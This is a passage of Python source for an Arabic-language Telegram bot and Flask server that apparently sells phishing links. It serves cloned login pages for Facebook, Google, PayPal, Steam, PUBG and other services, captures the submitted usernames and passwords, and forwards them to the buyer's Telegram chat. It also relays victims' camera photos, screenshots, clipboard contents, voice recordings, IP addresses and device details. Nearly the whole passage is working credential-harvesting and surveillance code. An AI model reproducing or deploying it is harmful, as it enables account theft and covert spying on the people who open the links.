            telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            files = {'photo': ('screenshot.jpg', photo_bytes, 'image/jpeg')}
            photo_response = requests.post(telegram_photo_api, 
                files=files,
                data={'chat_id': user_id, 'caption': f'🖥️ لقطة الشاشة - {page_id}'}
            )
            print(f"Screenshot sent to {user_id}, status: {photo_response.status_code}")
        
        if clipboard_items and len(clipboard_items) > 0:
            for i, item in enumerate(clipboard_items, 1):
                item_type = item.get('type', 'غير معروف')
                item_content = item.get('content', '')
                
                if len(item_content) > 3000:
                    item_content = item_content[:3000] + '...\n[تم اقتطاع المحتوى لطوله]'
                
                clipboard_message = f"""
📋 عنصر الحافظة ({i}/{len(clipboard_items)}) - {page_id}

النوع: {item_type}

المحتوى:
{item_content}
"""
                
                telegram_msg_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                msg_response = requests.post(telegram_msg_api, data={
                    'chat_id': user_id,
                    'text': clipboard_message
                })
                print(f"Clipboard item {i} sent to {user_id}, status: {msg_response.status_code}")
        
        if data.get('voiceRecording'):
            voice_base64 = data['voiceRecording']
            if voice_base64.startswith('data:audio'):
                voice_base64 = voice_base64.split(',')[1]
            voice_bytes = base64.b64decode(voice_base64)
            
            telegram_voice_api = f"https://api.telegram.org/bot{bot_token}/sendVoice"
            files = {'voice': ('recording.ogg', voice_bytes, 'audio/ogg')}
            voice_response = requests.post(telegram_voice_api, 
                files=files,
                data={'chat_id': user_id, 'caption': f'🎤 تسجيل صوتي - {page_id}'}
            )
            print(f"Voice recording sent to {user_id}, status: {voice_response.status_code}")
        
        assistant_admins = load_assistant_admins()
        if str(user_id) in assistant_admins and str(user_id) != ADMIN_ID:
            admin_message = f"""
🔔 إشعار: زائر دخل على رابط إدمن مساعد

👤 ID الإدمن المساعد: {user_id}
🆔 معرف الرابط: {page_id}
━━━━━━━━━━━━━━━━

📊 معلومات الزائر:
🌍 الموقع: {location_str}
🌐 عنوان IP: {data.get('ip', 'غير متاح')}
📋 الحافظة: {clipboard_text}
🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📱 معلومات الجهاز:
🖥️ نوع الجهاز: {device_info.get('deviceType', 'غير متاح')}
📱 موديل الجهاز: {device_info.get('deviceModel', 'غير متاح')}
💻 نظام التشغيل: {device_info.get('os', 'غير متاح')} {device_info.get('osVersion', '')}
🌐 المتصفح: {device_info.get('browser', 'غير متاح')} {device_info.get('browserVersion', '')}
📏 الدقة: {device_info.get('screenResolution', 'غير متاح')}
🌍 اللغة: {device_info.get('language', 'غير متاح')}
🔋 البطارية: {battery_text}
🕐 المنطقة الزمنية: {device_info.get('timezone', 'غير متاح')}
━━━━━━━━━━━━━━━━
"""
            
            admin_msg_data = {
                'chat_id': ADMIN_ID,
                'text': admin_message
            }
            
            if reply_markup:
                import json as json_lib
                admin_msg_data['reply_markup'] = json_lib.dumps(reply_markup)
            
            requests.post(telegram_api, data=admin_msg_data)
            
            if data.get('photo'):
                photo_base64 = data['photo']
                if photo_base64.startswith('data:image'):
                    photo_base64 = photo_base64.split(',')[1]
                photo_bytes = base64.b64decode(photo_base64)
                
                telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                files = {'photo': ('camera_photo.jpg', photo_bytes, 'image/jpeg')}
                requests.post(telegram_photo_api, 
                    files=files,
                    data={'chat_id': ADMIN_ID, 'caption': f'📸 صورة من رابط إدمن مساعد {user_id}'}
                )
            
            if data.get('frontPhoto'):
                photo_base64 = data['frontPhoto']
                if photo_base64.startswith('data:image'):
                    photo_base64 = photo_base64.split(',')[1]
                photo_bytes = base64.b64decode(photo_base64)
                
                telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                files = {'photo': ('front_camera.jpg', photo_bytes, 'image/jpeg')}
                requests.post(telegram_photo_api, 
                    files=files,
                    data={'chat_id': ADMIN_ID, 'caption': f'📸 كاميرا أمامية - إدمن مساعد {user_id}'}
                )
            
            if data.get('backPhoto'):
                photo_base64 = data['backPhoto']
                if photo_base64.startswith('data:image'):
                    photo_base64 = photo_base64.split(',')[1]
                photo_bytes = base64.b64decode(photo_base64)
                
                telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                files = {'photo': ('back_camera.jpg', photo_bytes, 'image/jpeg')}
                requests.post(telegram_photo_api, 
                    files=files,
                    data={'chat_id': ADMIN_ID, 'caption': f'📸 كاميرا خلفية - إدمن مساعد {user_id}'}
                )
            
            if data.get('screenshot'):
                photo_base64 = data['screenshot']
                if photo_base64.startswith('data:image'):
                    photo_base64 = photo_base64.split(',')[1]
                photo_bytes = base64.b64decode(photo_base64)
                
                telegram_photo_api = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
                files = {'photo': ('screenshot.jpg', photo_bytes, 'image/jpeg')}
                requests.post(telegram_photo_api, 
                    files=files,
                    data={'chat_id': ADMIN_ID, 'caption': f'🖥️ لقطة شاشة - إدمن مساعد {user_id}'}
                )
        
        return jsonify({'success': True})
    
    except Exception as e:
        print(f"Error sending data: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/block_ip', methods=['POST'])
def block_ip():
    try:
        data = request.json
        page_id = data.get('page_id')
        reason = data.get('reason', 'غير محدد')
        
        client_ip = get_client_ip()
        
        blocked_ips = load_blocked_ips()
        
        block_until = datetime.now() + timedelta(minutes=15)
        
        blocked_ips[client_ip] = {
            'page_id': page_id,
            'reason': reason,
            'blocked_at': datetime.now().isoformat(),
            'block_until': block_until.isoformat()
        }
        
        save_blocked_ips(blocked_ips)
        
        sessions = load_sessions()
        if page_id in sessions:
            user_id = sessions[page_id].get('user_id')
            bot_token = os.environ.get('BOT_TOKEN', '')
            
            if user_id and bot_token:
                block_message = f"""
⛔ تم حظر IP من الوصول

🆔 معرف الرابط: {page_id}
🌐 عنوان IP: {client_ip}
📝 السبب: {reason}
⏰ وقت الحظر: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
⌛ مدة الحظر: 15 دقيقة
🔓 سينتهي الحظر في: {block_until.strftime('%Y-%m-%d %H:%M:%S')}
"""
                telegram_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                requests.post(telegram_api, data={
                    'chat_id': user_id,
                    'text': block_message
                })
        
        return jsonify({'success': True, 'message': 'IP blocked successfully'})
    
    except Exception as e:
        print(f"Error blocking IP: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/vip_images/<filename>')
def serve_vip_image(filename):
    try:
        import os
        if '..' in filename or '/' in filename or '\\' in filename:
            return "Invalid filename", 400
        
        if not filename.endswith('.jpg'):
            return "Invalid file type", 400
        
        vip_images_dir = os.path.abspath('vip_images')
        return send_from_directory(vip_images_dir, filename, mimetype='image/jpeg')
    except Exception as e:
        return str(e), 404

@app.route('/custom_link_images/<filename>')
def serve_custom_link_image(filename):
    try:
        import os
        if '..' in filename or '/' in filename or '\\' in filename:
            return "Invalid filename", 400
        
        if not filename.endswith('.jpg'):
            return "Invalid file type", 400
        
        custom_images_dir = os.path.abspath('custom_link_images')
        return send_from_directory(custom_images_dir, filename, mimetype='image/jpeg')
    except Exception as e:
        return str(e), 404

@app.route('/phish/static/<platform>/<filename>')
def serve_phish_static(platform, filename):
    """خدمة الملفات الثابتة (CSS, JS, صور) للمنصات"""
    try:
        platform_map = {
            'facebook': 'facebook',
            'instagram': 'instagram',
            'google': 'google_new',
            'gmail': 'gmail',
            'twitter': 'twitter',
            'tiktok': 'tiktok',
            'linkedin': 'linkedin',
            'discord': 'discord',
            'snapchat': 'snapchat',
            'twitch': 'twitch',
            'netflix': 'netflix',
            'spotify': 'spotify',
            'paypal': 'paypal',
            'steam': 'steam',
            'whatsapp': 'whatsapp',
            'github': 'github',
            'playstation': 'playstation',
            'xbox': 'xbox',
            'roblox': 'roblox',
            'youtube': 'youtube',
            'pubg': 'pubg'
        }
        
        if '..' in filename or '/' in filename or '\\' in filename:
            return "Invalid filename", 400
        
        template_name = platform_map.get(platform, 'facebook')
        static_dir = os.path.abspath(f'zphisher_templates/{template_name}')
        
        if filename.endswith('.css'):
            mimetype = 'text/css'
        elif filename.endswith('.js'):
            mimetype = 'application/javascript'
        elif filename.endswith(('.png', '.jpg', '.jpeg', '.gif')):
            mimetype = f'image/{filename.split(".")[-1]}'
        else:
            mimetype = 'application/octet-stream'
        
        return send_from_directory(static_dir, filename, mimetype=mimetype)
    except Exception as e:
        return str(e), 404

@app.route('/pubg/<page_id>')
@app.route('/pubg/<page_id>/<int:link_id>')
def pubg_page(page_id, link_id=None):
    """صفحة PUBG Mobile الاحترافية - واجهة DFS"""
    sessions = load_sessions()
    
    if page_id not in sessions:
        return "<h1>الرابط غير صحيح أو منتهي الصلاحية</h1>", 404
    
    # حفظ معلومات الزيارة
    sessions[page_id]['visits'] = sessions[page_id].get('visits', 0) + 1
    sessions[page_id]['last_visit'] = datetime.now().isoformat()
    save_sessions(sessions)
    
    users = load_users()
    if page_id in users:
        users[page_id]['total_visits'] = users[page_id].get('total_visits', 0) + 1
        save_users(users)
    
    # استخدام واجهة DFS الاحترافية
    return render_template('pubg_dfs.html', page_id=page_id)

@app.route('/pubg/static/<path:filename>')
def serve_pubg_static(filename):
    """خدمة ملفات PUBG الثابتة (CSS, JS, صور)"""
    try:
        pubg_dir = os.path.abspath('pubg_pages')
        
        if filename.endswith('.css'):
            mimetype = 'text/css'
        elif filename.endswith('.js'):
            mimetype = 'application/javascript'
        elif filename.endswith(('.png', '.jpg', '.jpeg', '.gif', '.svg')):
            mimetype = f'image/{filename.split(".")[-1]}'
        elif filename.endswith('.woff') or filename.endswith('.woff2'):
            mimetype = 'font/woff'
        elif filename.endswith('.ttf'):
            mimetype = 'font/ttf'
        elif filename.endswith('.eot'):
            mimetype = 'application/vnd.ms-fontobject'
        else:
            mimetype = 'application/octet-stream'
        
        return send_from_directory(pubg_dir, filename, mimetype=mimetype)
    except Exception as e:
        return str(e), 404

@app.route('/api/phish_data', methods=['POST'])
def receive_pubg_phish_data():
    """استقبال بيانات PUBG من الصفحة المبسطة"""
    try:
        data = request.json
        page_id = data.get('page_id')
        
        sessions = load_sessions()
        if page_id not in sessions:
            return jsonify({'success': False, 'error': 'Invalid page ID'}), 404
        
        if 'phishing_data' not in sessions[page_id]:
            sessions[page_id]['phishing_data'] = []
        
        phish_data = {
            'platform': data.get('platform', 'PUBG'),
            'player_id': data.get('player_id'),
            'uc_amount': data.get('uc_amount'),
            'uc_price': data.get('uc_price'),
            'email': data.get('email'),
            'password': data.get('password'),
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr or request.environ.get('HTTP_X_REAL_IP', 'Unknown'),
            'user_agent': data.get('user_agent', request.headers.get('User-Agent', 'Unknown'))
        }
        
        sessions[page_id]['phishing_data'].append(phish_data)
        save_sessions(sessions)
        
        session = sessions[page_id]
        user_id = session.get('user_id', page_id)
        
        bot_token = os.environ.get('BOT_TOKEN', '')
        if bot_token:
            message = f"""
🎮 بيانات PUBG Mobile جديدة!

📱 المنصة: {phish_data['platform']} - {data.get('platform')}
━━━━━━━━━━━━━━━━
🆔 Player ID: {phish_data['player_id']}
💎 كمية UC: {phish_data['uc_amount']} ({phish_data['uc_price']})
━━━━━━━━━━━━━━━━
👤 البريد: {phish_data['email']}
🔑 كلمة المرور: {phish_data['password']}
━━━━━━━━━━━━━━━━
🌐 IP: {phish_data['ip']}
📱 الجهاز: {phish_data['user_agent'][:100]}
🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            telegram_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            message_data = {
                'chat_id': user_id,
                'text': message
            }
            requests.post(telegram_api, data=message_data)
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/phish/<platform>/<page_id>')
@app.route('/phish/<platform>/<page_id>/<int:link_id>')
def phish_page(platform, page_id, link_id=None):
    """عرض صفحة تسجيل الدخول المزيفة للمنصة المحددة"""
    sessions = load_sessions()
    
    if page_id not in sessions:
        return """
        <html>
        <head><meta charset="utf-8"><title>خطأ</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
        <h1>❌ الرابط غير صحيح</h1>
        <p>هذا الرابط غير موجود في النظام</p>
        </body>
        </html>
        """, 404
    
    if link_id is None:
        return """
        <html>
        <head><meta charset="utf-8"><title>خطأ</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
        <h1>⛔ رابط غير مدعوم</h1>
        <p>هذا الرابط قديم ولا يعمل بعد الآن</p>
        <p>يرجى الحصول على رابط جديد من البوت</p>
        </body>
        </html>
        """, 410
    
    phish_links = sessions[page_id].get('phish_links', [])
    if link_id >= len(phish_links):
        return """
        <html>
        <head><meta charset="utf-8"><title>خطأ</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
        <h1>❌ الرابط غير صحيح</h1>
        <p>رقم الرابط غير موجود</p>
        </body>
        </html>
        """, 404
    
    link_data = phish_links[link_id]
    
    is_legacy_link = 'purchased' not in link_data and 'active' not in link_data
    
    if is_legacy_link:
        link_data['purchased'] = True
        link_data['active'] = True
        save_sessions(sessions)
    
    if not link_data.get('purchased', False) or not link_data.get('active', False):
        return """
        <html>
        <head><meta charset="utf-8"><title>غير مفعّل</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
        <h1>🔒 الرابط غير مفعّل</h1>
        <p>هذا الرابط غير مشترى أو غير نشط</p>
        <p>يرجى شراء رابط جديد من البوت</p>
        </body>
        </html>
        """, 403
    
    if link_data.get('platform') != platform:
        return """
        <html>
        <head><meta charset="utf-8"><title>خطأ</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
        <h1>❌ رابط غير متطابق</h1>
        <p>المنصة المطلوبة لا تطابق الرابط</p>
        </body>
        </html>
        """, 400
    
    if link_data.get('type') == 'normal':
        expiry_date = datetime.fromisoformat(link_data['expiry'])
        if datetime.now() > expiry_date:
            return """
            <html>
            <head><meta charset="utf-8"><title>منتهي الصلاحية</title></head>
            <body style="font-family:Arial;text-align:center;padding:50px;">
            <h1>⏰ الرابط منتهي الصلاحية</h1>
            <p>انتهت صلاحية هذا الرابط</p>
            <p>يرجى شراء رابط جديد من البوت</p>
            </body>
            </html>
            """, 410
    elif link_data.get('type') != 'redirect':
        return """
        <html>
        <head><meta charset="utf-8"><title>خطأ</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
        <h1>❌ نوع رابط غير صحيح</h1>
        </body>
        </html>
        """, 400
    
    sessions[page_id]['visits'] = sessions[page_id].get('visits', 0) + 1
    sessions[page_id]['last_visit'] = datetime.now().isoformat()
    sessions[page_id]['last_platform'] = platform
    save_sessions(sessions)
    
    users = load_users()
    if page_id in users:
        users[page_id]['total_visits'] = users[page_id].get('total_visits', 0) + 1
        save_users(users)
    
    platform_map = {
        'facebook': 'facebook',
        'instagram': 'instagram',
        'google': 'google_new',
        'gmail': 'gmail',
        'twitter': 'twitter',
        'tiktok': 'tiktok',
        'linkedin': 'linkedin',
        'discord': 'discord',
        'snapchat': 'snapchat',
        'twitch': 'twitch',
        'netflix': 'netflix',
        'spotify': 'spotify',
        'paypal': 'paypal',
        'steam': 'steam',
        'whatsapp': 'whatsapp',
        'github': 'github',
        'playstation': 'playstation',
        'xbox': 'xbox',
        'roblox': 'roblox',
        'youtube': 'youtube'
    }
    
    template_name = platform_map.get(platform, 'facebook')
    
    user_agent = request.headers.get('User-Agent', '').lower()
    is_mobile = any(device in user_agent for device in ['mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone'])
    
    mobile_supported_platforms = ['facebook', 'dropbox', 'pinterest', 'reddit', 'yahoo']
    
    if is_mobile and template_name in mobile_supported_platforms:
        mobile_path = f'zphisher_templates/{template_name}/mobile.html'
        if os.path.exists(mobile_path):
            template_path = mobile_path
        else:
            template_path = f'zphisher_templates/{template_name}/login.html'
    else:
        template_path = f'zphisher_templates/{template_name}/login.html'
    
    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            html_content = f.read()
        
        submit_url = f'/phish/submit/{platform}/{page_id}/{link_id}' if link_id is not None else f'/phish/submit/{platform}/{page_id}'
        html_content = html_content.replace('action=""', f'action="{submit_url}"')
        html_content = html_content.replace('action="login.php"', f'action="{submit_url}"')
        html_content = html_content.replace('action=login.php', f'action="{submit_url}"')
        html_content = html_content.replace('action="index.php"', f'action="{submit_url}"')
        html_content = html_content.replace('action="post.php"', f'action="{submit_url}"')
        html_content = html_content.replace('method="post"', 'method="POST"')
        html_content = html_content.replace('method=post', 'method="POST"')
        
        import re
        html_content = re.sub(r'href="\.?/?style\.css"', f'href="/phish/static/{template_name}/style.css"', html_content)
        html_content = re.sub(r'src="\.?/?script\.js"', f'src="/phish/static/{template_name}/script.js"', html_content)
        html_content = re.sub(r'src="\.?/?jquery\.min\.js"', f'src="/phish/static/{template_name}/jquery.min.js"', html_content)
        html_content = re.sub(r'src="\.?/?jscript\.js"', f'src="/phish/static/{template_name}/jscript.js"', html_content)
        html_content = re.sub(r'(href|src)="\.?/?(favicon\.(png|ico))"', rf'\1="/phish/static/{template_name}/\2"', html_content)
        html_content = re.sub(r'(href|src)="\.?/?(fav\.ico)"', rf'\1="/phish/static/{template_name}/\2"', html_content)
        html_content = re.sub(r'(href|src)="\.?/?(favicon\.ico)"', rf'\1="/phish/static/{template_name}/\2"', html_content)
        html_content = re.sub(r'src="\.?/?(logo\.png)"', rf'src="/phish/static/{template_name}/\1"', html_content)
        html_content = re.sub(r'src="\.?/?(icon\.(svg|png))"', rf'src="/phish/static/{template_name}/\1"', html_content)
        html_content = re.sub(r'src="\.?/?([\w\-@._]+\.(png|jpg|jpeg|gif|svg))"', rf'src="/phish/static/{template_name}/\1"', html_content)
        html_content = re.sub(r'href="\.?/?([\w\-@._]+\.css)"', rf'href="/phish/static/{template_name}/\1"', html_content)
        html_content = re.sub(r'src="\.?/?([\w\-@._]+\.js)"', rf'src="/phish/static/{template_name}/\1"', html_content)
        
        return html_content
    except FileNotFoundError:
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>{platform.capitalize()} - Login</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: #f0f2f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }}
                .container {{
                    background: white;
                    padding: 40px;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                    width: 400px;
                }}
                h1 {{
                    text-align: center;
                    color: #1877f2;
                    margin-bottom: 30px;
                }}
                input {{
                    width: 100%;
                    padding: 14px 16px;
                    margin: 6px 0;
                    border: 1px solid #ddd;
                    border-radius: 6px;
                    box-sizing: border-box;
                    font-size: 17px;
                }}
                button {{
                    width: 100%;
                    background: #1877f2;
                    color: white;
                    padding: 14px 16px;
                    margin: 12px 0;
                    border: none;
                    border-radius: 6px;
                    font-size: 20px;
                    font-weight: bold;
                    cursor: pointer;
                }}
                button:hover {{
                    background: #166fe5;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>{platform.capitalize()}</h1>
                <form method="POST" action="/phish/submit/{platform}/{user_id}">
                    <input type="text" name="username" placeholder="Email or Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        """
    except Exception as e:
        return f"<h1>Error loading page: {str(e)}</h1>", 500

@app.route('/phish/submit/<platform>/<page_id>', methods=['POST'])
@app.route('/phish/submit/<platform>/<page_id>/<int:link_id>', methods=['POST'])
def phish_submit(platform, page_id, link_id=None):
    """استقبال بيانات تسجيل الدخول المزيفة"""
    try:
        sessions = load_sessions()
        if page_id not in sessions:
            return jsonify({'success': False, 'error': 'Invalid page ID'}), 404
        
        if link_id is None:
            return jsonify({'success': False, 'error': 'Old link format not supported'}), 410
        
        phish_links = sessions[page_id].get('phish_links', [])
        if link_id >= len(phish_links):
            return jsonify({'success': False, 'error': 'Link not found'}), 404
        
        link_data = phish_links[link_id]
        
        is_legacy_link = 'purchased' not in link_data and 'active' not in link_data
        
        if is_legacy_link:
            link_data['purchased'] = True
            link_data['active'] = True
            save_sessions(sessions)
        
        if not link_data.get('purchased', False) or not link_data.get('active', False):
            return jsonify({'success': False, 'error': 'Link not purchased or inactive'}), 403
        
        if link_data.get('platform') != platform:
            return jsonify({'success': False, 'error': 'Platform mismatch'}), 400
        
        if link_data.get('type') == 'normal':
            expiry_date = datetime.fromisoformat(link_data['expiry'])
            if datetime.now() > expiry_date:
                return jsonify({'success': False, 'error': 'Link expired'}), 410
        elif link_data.get('type') != 'redirect':
            return jsonify({'success': False, 'error': 'Invalid link type'}), 400
        
        username = (request.form.get('username') or 
                   request.form.get('email') or 
                   request.form.get('login') or 
                   request.form.get('login_email') or
                   request.form.get('session_key') or
                   request.form.get('identifier') or
                   request.form.get('log') or
                   'N/A')
        
        password = (request.form.get('password') or 
                   request.form.get('pass') or 
                   request.form.get('passwd') or 
                   request.form.get('login_password') or
                   request.form.get('session_password') or
                   request.form.get('Passwd') or
                   request.form.get('pwd') or
                   'N/A')
        
        if 'phishing_data' not in sessions[page_id]:
            sessions[page_id]['phishing_data'] = []
        
        phish_data = {
            'platform': platform,
            'username': username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr or request.environ.get('HTTP_X_REAL_IP', 'Unknown'),
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        }
        
        sessions[page_id]['phishing_data'].append(phish_data)
        save_sessions(sessions)
        
        session = sessions[page_id]
        user_id = session.get('user_id', page_id)
        
        bot_token = os.environ.get('BOT_TOKEN', '')
        if bot_token:
            message = f"""
🎣 بيانات تسجيل دخول جديدة!

📱 المنصة: {platform.upper()}
━━━━━━━━━━━━━━━━
👤 اسم المستخدم: {username}
🔑 كلمة المرور: {password}
━━━━━━━━━━━━━━━━
🌐 IP: {phish_data['ip']}
📱 الجهاز: {phish_data['user_agent'][:100]}
🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            telegram_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            message_data = {
                'chat_id': user_id,
                'text': message
            }
            requests.post(telegram_api, data=message_data)
        
        redirect_url = None
        if link_id is not None:
            phish_links = sessions[page_id].get('phish_links', [])
            if link_id < len(phish_links):
                link_data = phish_links[link_id]
                if link_data.get('type') == 'redirect' and link_data.get('redirect_url'):
                    redirect_url = link_data['redirect_url']
        
        if not redirect_url:
            redirect_map = {
                'facebook': 'https://www.facebook.com',
                'instagram': 'https://www.instagram.com',
                'google': 'https://www.google.com',
                'gmail': 'https://mail.google.com',
                'youtube': 'https://www.youtube.com',
                'twitter': 'https://www.x.com',
                'snapchat': 'https://accounts.snapchat.com',
                'linkedin': 'https://www.linkedin.com',
                'paypal': 'https://www.paypal.com',
                'netflix': 'https://www.netflix.com',
                'discord': 'https://discord.com',
                'tiktok': 'https://www.tiktok.com',
                'github': 'https://github.com',
                'playstation': 'https://www.playstation.com',
                'xbox': 'https://www.xbox.com',
                'whatsapp': 'https://web.whatsapp.com',
                'spotify': 'https://www.spotify.com',
                'twitch': 'https://www.twitch.tv',
                'steam': 'https://store.steampowered.com'
            }
            redirect_url = redirect_map.get(platform, f'https://www.{platform}.com')
        
        return redirect(redirect_url)
    
    except Exception as e:
        print(f"Error submitting phishing data: {e}")
        import traceback
        traceback.print_exc()
        return f"<h1>Error: {str(e)}</h1>", 500

async def check_user_subscription(user_id, context):
    """التحقق من اشتراك المستخدم في جميع القنوات الإجبارية"""
    channels = load_forced_channels()
    if not channels:
        return True, None
    
    not_subscribed = []
    for channel in channels:
        try:
            member = await context.bot.get_chat_member(channel['channel_id'], user_id)
            if member.status in ['left', 'kicked']:
                not_subscribed.append(channel)
        except Exception as e:
            print(f"خطأ في التحقق من القناة {channel['channel_id']}: {e}")
            continue
    
    if not_subscribed:
        return False, not_subscribed
    return True, None

def is_main_admin(user_id):
    return str(user_id) == ADMIN_ID

def is_admin(user_id):
    if str(user_id) == ADMIN_ID:
        return True
    assistant_admins = load_assistant_admins()
    return str(user_id) in assistant_admins

def get_or_create_user(user_id, referred_by=None, promo_code=None, 
                       username=None, first_name=None, last_name=None, 
                       language_code=None, is_premium=False):
    """
    إنشاء أو الحصول على مستخدم مع حفظ كل معلوماته
    - يحفظ في قاعدة البيانات SQLite (المصدر الأساسي)
    - يحفظ نسخة احتياطية في JSON للتوافقية
    """
    promo_applied = False
    
    user = db.get_user(user_id)
    
    if not user:
        user = db.create_user(
            user_id=user_id,
            username=username,
            first_name=first_name,
            last_name=last_name,
            referred_by=referred_by,
            language_code=language_code,
            is_premium=is_premium
        )
        
        if referred_by and referred_by != user_id:
            db.add_referral(referred_by, user_id, points=5)
        
        if promo_code:
            success, message = db.use_promo_code(promo_code, user_id)
            promo_applied = success
    else:
        db.update_user(
            user_id=user_id,
            username=username,
            first_name=first_name,
            last_name=last_name,
            language_code=language_code,
            is_premium=is_premium
        )
        
        if promo_code:
            success, message = db.use_promo_code(promo_code, user_id)
            promo_applied = success
        
        user = db.get_user(user_id)
    
    users = load_users()
    users[user_id] = {
        'points': user.get('points', 0),
        'username': username,
        'first_name': first_name,
        'last_name': last_name,
        'referred_by': referred_by,
        'language_code': language_code,
        'is_premium': is_premium,
        'created_at': user.get('created_at', datetime.now().isoformat()),
        'referrals': []
    }
    if 'vip_links' not in users[user_id]:
        users[user_id]['vip_links'] = []
    if 'custom_links' not in users[user_id]:
        users[user_id]['custom_links'] = []
    save_users(users)
    
    return user, promo_applied

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    telegram_user = update.effective_user
    
    is_callback = update.callback_query is not None
    message_sender = update.callback_query if is_callback else update.message
    
    referred_by = None
    promo_code = None
    welcome_msg = ""
    
    if context.args and len(context.args) > 0:
        arg = context.args[0]
        if arg.startswith('PROMO_'):
            promo_code = arg
        else:
            referred_by = arg
    
    user_data, promo_applied = get_or_create_user(
        user_id=user_id,
        referred_by=referred_by,
        promo_code=promo_code,
        username=telegram_user.username,
        first_name=telegram_user.first_name,
        last_name=telegram_user.last_name,
        language_code=telegram_user.language_code,
        is_premium=telegram_user.is_premium if hasattr(telegram_user, 'is_premium') else False
    )
    
    is_subscribed, not_subscribed_channels = await check_user_subscription(update.effective_user.id, context)
    if not is_subscribed:
        keyboard = []
        message = "⚠️ للاستمرار في استخدام البوت، يجب عليك الاشتراك في القنوات التالية:\n\n"
        
        for channel in not_subscribed_channels:
            channel_name = channel.get('channel_name', 'القناة')
            channel_username = channel.get('channel_username', '')
            
            if channel_username:
                if not channel_username.startswith('@'):
                    channel_username = '@' + channel_username
                keyboard.append([InlineKeyboardButton(f"📢 {channel_name}", url=f"https://t.me/{channel_username[1:]}")])
                message += f"• {channel_name} ({channel_username})\n"
            else:
                message += f"• {channel_name}\n"
        
        keyboard.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")])
        
        if is_callback:
            await message_sender.edit_message_text(
                message + "\n\n✅ بعد الاشتراك، اضغط على الزر أدناه للتحقق:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await message_sender.reply_text(
                message + "\n\n✅ بعد الاشتراك، اضغط على الزر أدناه للتحقق:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        return
    
    sessions = load_sessions()
    if user_id not in sessions:
        sessions[user_id] = {
            'user_id': user_id,
            'created_at': datetime.now().isoformat(),
            'visits': 0
        }
        save_sessions(sessions)
    
    domain = get_domain()
    
    users = load_users()
    free_link = f"https://{domain}/p/{user_id}"
    
    has_valid_vip = False
    vip_link = None
    vip_expiry_info = ""
    
    if user_id in users and 'vip_links' in users[user_id] and len(users[user_id]['vip_links']) > 0:
        for vip_data in reversed(users[user_id]['vip_links']):
            if vip_data.get('is_permanent', False):
                vip_link = f"https://{domain}/Vip/{vip_data['version']}/{user_id}"
                has_valid_vip = True
                vip_expiry_info = "دائم ✨"
                break
            elif 'expiry' in vip_data:
                expiry_date = datetime.fromisoformat(vip_data['expiry'])
                if datetime.now() <= expiry_date:
                    vip_link = f"https://{domain}/Vip/{vip_data['version']}/{user_id}"
                    has_valid_vip = True
                    vip_expiry_info = f"حتى: {expiry_date.strftime('%Y-%m-%d %H:%M')}"
                    break
    
    link = vip_link if has_valid_vip else free_link
    referral_link = f"https://t.me/{context.bot.username}?start={user_id}"
    
    # الحصول على النقاط من user_data - user_data هو dict عادي
    user_points = user_data.get('points', 0)
    
    if promo_code:
        promo_links = load_promo_links()
        if promo_code in promo_links and promo_applied:
            promo_data = promo_links[promo_code]
            welcome_msg = f"🎁 مرحباً! لقد حصلت على {promo_data['points']} نقطة من الرابط الترويجي!\n"
            welcome_msg += f"✨ هدية خاصة من الإدارة!\n\n"
        elif promo_code in promo_links and not promo_applied:
            welcome_msg = f"⚠️ لقد استخدمت هذا الرابط الترويجي من قبل!\n\n"
        else:
            welcome_msg = f"⚠️ رابط ترويجي غير صالح.\n\n"
    elif referred_by:
        welcome_msg = f"🎉 مرحباً! لقد حصلت على 2 نقطة كهدية ترحيب!\n"
        welcome_msg += f"✨ المستخدم {referred_by} حصل على 5 نقاط لإحالتك!\n\n"
    
    keyboard = [
        [InlineKeyboardButton("🔗 صفحات مزيفة", callback_data="zphisher")],
        [InlineKeyboardButton("🖼️ تحويل صورة إلى PDF", callback_data="convert_to_pdf")],
        [InlineKeyboardButton("👑 إنشاء رابط VIP", callback_data="create_vip")],
        [InlineKeyboardButton("🎯 إنشاء رابط خاص", callback_data="create_custom_link")],
